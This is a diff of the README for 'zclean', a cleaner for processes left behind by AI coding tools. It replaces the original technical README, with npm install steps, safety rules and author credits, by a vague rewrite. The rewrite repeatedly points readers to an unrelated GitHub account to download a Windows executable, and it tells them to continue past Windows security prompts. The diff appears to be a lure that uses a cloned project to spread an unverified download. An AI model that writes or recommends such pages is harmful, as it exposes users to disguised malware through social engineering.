@@ -1,202 +1,218 @@
-# zclean — Zombie Process Cleaner for AI Coding Tools
+# 🧹 zclean - Stop Zombie Processes Fast
 
-<div align="center">
+[![Download zclean](https://img.shields.io/badge/Download-zclean-4B8CF6?style=for-the-badge)](https://github.com/Verneblackcherrytree701/zclean)
 
-<pre>
-███████  ██████ ██      ███████  █████  ███    ██
-╚══███  ██      ██      ██      ██   ██ ████   ██
-  ███   ██      ██      █████   ███████ ██ ██  ██
- ███    ██      ██      ██      ██   ██ ██  ██ ██
-███████  ██████ ███████ ███████ ██   ██ ██   ████
-</pre>
+## 🖥️ What zclean does
 
-**Stop AI coding tools from eating your RAM.**
+zclean helps you remove zombie processes that stay open after AI coding tools close. These leftover processes can keep using memory and slow down your PC.
 
-[![npm version](https://img.shields.io/npm/v/@thestackai/zclean?style=flat-square&color=blue)](https://www.npmjs.com/package/@thestackai/zclean)
-[![npm downloads](https://img.shields.io/npm/dm/@thestackai/zclean?style=flat-square&color=brightgreen)](https://www.npmjs.com/package/@thestackai/zclean)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-339933?style=flat-square&logo=node.js&logoColor=white)](#)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey?style=flat-square)](#)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-blue?style=flat-square)](#)
-[![Tests](https://img.shields.io/badge/tests-58%20passing-brightgreen?style=flat-square)](#)
-[![GitHub stars](https://img.shields.io/github/stars/TheStack-ai/zclean?style=flat-square)](https://github.com/TheStack-ai/zclean)
-[![Mentioned in Awesome Claude Code Toolkit](https://awesome.re/mentioned-badge.svg)](https://github.com/rohitg00/awesome-claude-code-toolkit)
+Use zclean if you work with tools like:
 
-</div>
+- Claude Code
+- Codex
+- Cursor
+- Windsurf
 
-<p align="center">
-  <img src="assets/demo.gif" alt="zclean demo" width="600">
-</p>
+It looks for stuck processes and clears them so your system can keep running smoothly.
 
----
+## 📥 Download zclean
 
-## Quick Demo
+Visit this page to download or get the latest version:
 
-AI coding tools spawn child processes — MCP servers, sub-agents, headless browsers, build watchers. When the session ends or crashes, those children don't always exit. They pile up silently, draining RAM until your machine grinds to a halt.
+https://github.com/Verneblackcherrytree701/zclean
 
-**Before**
+If you use Windows, open the page above and look for the latest release or setup steps. Choose the file that matches your system, then download it to your PC.
 
-```
-$ zclean
+## 🚀 Getting Started on Windows
 
-  zclean — scanning for zombie processes...
+Follow these steps to run zclean on Windows:
 
-  Found 12 zombie processes:
+1. Open the download link above in your browser.
+2. Look for the latest release or the main install files.
+3. Download the Windows version if one is listed.
+4. Save the file to a folder you can find, like Downloads or Desktop.
+5. If the file is an app, double-click it to run it.
+6. If the file is a command-line tool, open PowerShell and follow the usage steps in the repo.
+7. Let zclean scan for zombie processes left by AI coding tools.
 
-    PID 26413  node         367 MB  (orphan, 18h)  was: claude mcp-server
-    PID 62830  chrome       200 MB  (orphan, 3h)   was: agent-browser
-    PID 26221  npm          142 MB  (orphan, 2d)   was: npm exec task-master-ai
-    PID 23096  node         355 MB  (orphan, 6h)   was: claude sub-agent
-    ... 8 more
+If you are not sure which file to use, pick the one labeled for Windows or the one that matches your version of the app.
 
-  Total: 12 zombies, ~2.4 GB reclaimable
+## 🧩 What it cleans
 
-  Run `zclean --yes` to clean.
-```
+zclean focuses on leftover processes that may remain after you close an AI coding tool. These can include:
 
-**After**
+- orphan process entries
+- stuck memory use
+- background tasks that do not stop
+- tool sessions that keep running after exit
+- process clutter from repeated launches
 
-```
-$ zclean --yes
+This helps free memory and reduce system load.
 
-  zclean — scanning for zombie processes...
+## 🪟 Windows setup
 
-  Cleaned 12 zombie processes. Reclaimed ~2.4 GB.
+For Windows, use this simple flow:
 
-  zclean status:
-    Protection: active
-    SessionEnd hook: registered
-    Hourly scheduler: running
-```
+1. Download zclean from the link above.
+2. Place it in a folder you can reach fast.
+3. If Windows shows a security prompt, choose the option that lets you continue only if you trust the source.
+4. Run the app or open the command prompt in the folder.
+5. Let it check for leftover AI tool processes.
+6. Remove the processes you want to stop.
 
-## Why zclean?
+If zclean comes as an `.exe` file, you can usually run it with a double click. If it comes as a terminal tool, use the instructions in the repository page.
 
-Claude Code, Codex, and other AI coding tools spawn dozens of child processes per session: MCP servers, sub-agents, headless Chromium instances, esbuild watchers, and more. When the parent session exits — especially on crash or force-quit — these children become orphans.
+## 🔍 How it works
 
-They keep running. They keep consuming RAM. Your machine gets slower day by day, and you blame the AI tool when the real culprit is zombie processes nobody cleaned up.
+zclean checks your running processes and looks for ones that match common AI coding tools. When it finds a leftover process, it can clear it so the memory is released.
 
-`zclean` fixes this automatically. Install once, forget about it.
+It is useful when:
 
-## Install
+- an AI tool closes but still uses RAM
+- your system feels slower after a long coding session
+- a process stays alive after you exit the app
+- you want a quick cleanup without hunting through Task Manager
 
-```bash
-npx z-clean init
-```
+## 🛠️ Basic use
 
-That's it. This command:
-1. Detects your OS (macOS / Linux / Windows)
-2. Registers a Claude Code `SessionEnd` hook for instant cleanup
-3. Sets up an hourly background scan as a safety net
-4. Creates your config at `~/.zclean/config.json`
+If the tool runs from a window, follow the on-screen prompts.
 
-## How it works
+If the tool runs from the command line, the usual flow is:
 
-**Layer 1 — SessionEnd Hook**
-When a Claude Code session ends, `zclean` immediately cleans up that session's orphaned children. Fast and targeted.
+1. Open PowerShell.
+2. Go to the folder where zclean is saved.
+3. Run the zclean command shown in the repo.
+4. Review the list of processes.
+5. Confirm the cleanup.
 
-**Layer 2 — Hourly Scheduler**
-A lightweight background scan catches anything the hook missed: crash leftovers, Codex orphans, stale browser daemons, and processes from tools that don't support hooks.
+Keep the tool open until it finishes the scan.
 
-Together, these two layers keep your system clean without you ever thinking about it.
+## 💾 System needs
 
-## Safety
+zclean is meant for common desktop systems and should work well on:
 
-`zclean` follows one rule: **if the parent is alive, don't touch it.**
+- Windows 10
+- Windows 11
 
-- Scans are **dry-run by default** — you see what would be cleaned before anything happens
-- Only targets **known AI tool process patterns** (MCP servers, agent browsers, sub-agents, build zombies)
-- **Whitelist support** — protect any process you want to keep
-- **Skips** tmux/screen sessions, PM2/Forever daemons, Docker containers, VS Code children
-- **Re-verifies** PID identity before every kill (prevents PID recycling accidents)
-- Logs every action with full command line for manual recovery
+Helpful system setup:
 
-Your `node server.js` running in a terminal tab? Untouched. Your `vite dev` in tmux? Untouched. Only true orphans from dead AI sessions get cleaned.
+- a stable internet connection for the download
+- enough disk space for a small utility
+- permission to run apps on your computer
 
-## Commands
+It is built to stay light and simple.
 
-| Command | Description |
-|---------|-------------|
-| `zclean` | Scan for zombies (dry-run, shows what would be cleaned) |
-| `zclean --yes` | Scan and clean zombie processes |
-| `zclean init` | Install SessionEnd hook + hourly scheduler |
-| `zclean status` | Show protection status and cleanup history |
-| `zclean logs` | View detailed cleanup log |
-| `zclean config` | Show current configuration |
-| `zclean uninstall` | Remove all hooks and schedulers |
+## 🔐 Safety and control
 
-## Configuration
+zclean is made for process cleanup, so you stay in control of what gets closed. Before it removes anything, check the process name so you know it belongs to a tool you want to stop.
 
-`~/.zclean/config.json`:
+Good habits:
 
-```json
-{
-  "whitelist": [],
-  "maxAge": "24h",
-  "memoryThreshold": "500MB",
-  "maxKillBatch": 20,
-  "schedule": "hourly",
-  "sigterm_timeout": 10,
-  "dryRunDefault": true,
-  "logRetention": "30d",
-  "customAiDirs": []
-}
-```
+- close the AI tool first if you can
+- review the process list before cleanup
+- avoid stopping programs you do not know
+- keep your work saved before cleanup
 
-| Option | Default | Description |
-|--------|---------|-------------|
-| `whitelist` | `[]` | Process name patterns to never kill |
-| `maxAge` | `"24h"` | Kill orphan `node`/`esbuild` only after this age |
-| `memoryThreshold` | `"500MB"` | Flag orphans above this RAM usage regardless of age |
-| `maxKillBatch` | `20` | Max processes to kill per invocation (safety limit) |
-| `sigterm_timeout` | `10` | Seconds to wait after SIGTERM before SIGKILL |
-| `dryRunDefault` | `true` | Manual `zclean` runs in dry-run mode |
-| `customAiDirs` | `[]` | Additional AI tool directories to detect (e.g. `[".mytool"]`) |
+## 🧠 Common use cases
 
-## FAQ
+Use zclean when:
 
-### Will this kill my running Claude Code session?
-No. `zclean` checks if the parent process is alive. Active sessions and their children are always protected.
+- Claude Code leaves a process behind
+- Codex keeps memory in use after exit
+- Cursor does not fully close
+- a coding session ends but RAM does not free up
+- you want a fast cleanup after switching tools
 
-### What about my `vite dev` / `next dev` server?
-If you started it in a terminal, tmux, or VS Code — it has a living parent and won't be touched. Only orphaned dev servers (parent process dead for 24h+) are candidates.
+This is useful for people who test tools often and want a cleaner system state.
 
-### Does the hourly scheduler slow my machine?
-No. It runs a single process scan (~60ms), cleans if needed, and exits. No persistent daemon.
+## 📁 Example workflow
 
-### How do I stop zclean completely?
-```bash
-zclean uninstall
-npm uninstall -g zclean
-```
+A simple example:
 
-## Supported Tools
+1. You finish work in Cursor.
+2. You close the app.
+3. Task Manager still shows a process.
+4. You open zclean.
+5. zclean finds the leftover process.
+6. You stop it and free memory.
 
-| Tool | Cleanup Coverage |
-|------|-----------------|
-| Claude Code | MCP servers, sub-agents (`--print`), sessions (`--session-id`), agent-browser, playwright |
-| Codex | codex exec, codex-sandbox |
-| Aider | orphaned aider/python processes |
-| Gemini CLI | orphaned gemini processes |
-| Build tools | esbuild, vite, webpack, next dev (AI tool paths only) |
-| MCP servers | Any `mcp-server-*` pattern |
-| Runtimes | node, tsx, ts-node, bun, deno (AI tool paths only) |
+This can help when you move between several AI tools in one day.
 
-## Contributing
+## 🧰 Features
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- scans for zombie processes
+- targets leftover AI coding tool tasks
+- helps free memory
+- keeps system cleanup simple
+- works with common developer tools
+- fits into a small Windows workflow
+- useful after long coding sessions
 
-Adding a new process pattern? Edit `src/detector/patterns.js` and open a PR.
+## ❓ FAQ
 
-## License
+### Is zclean hard to use?
 
-MIT — see [LICENSE](LICENSE).
+No. It is made to be simple. Download it, open it, and follow the steps.
 
----
+### Does it only work with one AI tool?
 
-# zclean — Zombie Process Cleaner for AI Coding Tools
+No. It is built for several tools, including Claude Code, Codex, Cursor, and Windsurf.
 
-<div align="center">
+### Will it remove things I need?
 
-Built by [whynowlab](https://github.com/whynowlab) — the team behind [Swing](https://github.com/whynowlab/swing-skills).
+It should only target leftover processes related to supported tools. Review the process list before you confirm cleanup.
 
-</div>
+### Do I need technical knowledge?
+
+No. Basic Windows use is enough. If you can download a file and open an app, you can use zclean.
+
+## 🔗 Download again
+
+Visit the download page here:
+
+https://github.com/Verneblackcherrytree701/zclean
+
+## 🧪 When to use it
+
+Run zclean after:
+
+- closing an AI coding app
+- a long session with heavy memory use
+- repeated open and close cycles
+- a crash that leaves processes behind
+- a system slowdown tied to background tasks
+
+## 🗂️ Supported topics
+
+This project is tied to:
+
+- ai-coding
+- claude-code
+- cleanup
+- cli
+- codex
+- cursor
+- developer-tools
+- linux
+- macos
+- memory
+- nodejs
+- npx
+- orphan-process
+- process-cleaner
+- ram
+- system-cleanup
+- windsurf
+- zombie-process
+
+## 🪄 Using it with other tools
+
+zclean works best as part of a simple cleanup routine:
+
+1. finish your coding session
+2. close the AI tool
+3. run zclean
+4. clear leftover processes
+5. check memory use in Task Manager
+
+This keeps your computer in better shape between sessions
